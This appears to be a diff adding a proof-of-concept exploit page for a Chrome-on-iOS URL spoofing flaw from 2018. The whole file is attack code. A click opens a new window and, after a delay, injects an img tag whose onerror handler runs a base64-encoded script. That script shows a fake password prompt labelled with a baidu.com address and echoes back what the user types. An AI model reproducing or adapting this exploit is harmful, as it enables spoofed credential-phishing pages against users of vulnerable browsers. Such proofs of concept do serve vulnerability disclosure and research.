@@ -1,0 +1,23 @@
+<html>
+	<head>
+	    <title>Chrome URL spoofing vulnerability on IOS</title>
+	    <!--
+	        author: evi1m0.bat[at]gmail.com
+	        datetime: 2018/05/03 00:16:27
+	        test version: for iPhone 66.0.3359.122
+	    -->
+	</head>
+	<script>
+	    pwn = () => {
+	        x = open('', 'win');
+	        setTimeout(`
+	            x.document.write('<img src=@ onerror=eval(atob("dmFyIHB3ZD1wcm9tcHQoImh0dHBzOi8vdGVzdC5iYWlkdS5jb21cbmlucHV0IHlvdXIgcGFzc3dvcmRcbnRlc3QuLi4iKTtpZihwd2Qpe2FsZXJ0KCJwYXNzd29yZDogIitwd2QpfQ=="))><h2>Chrome URL spoofing vulnerability on IOS</h2>');
+	            `, 3000);
+	        setTimeout(`
+	            `, 2300);
+	    }
+	</script>
+	<h1>
+	    <a onclick="pwn()">ClickMe :-)</a>
+	</h1>
+	</html>
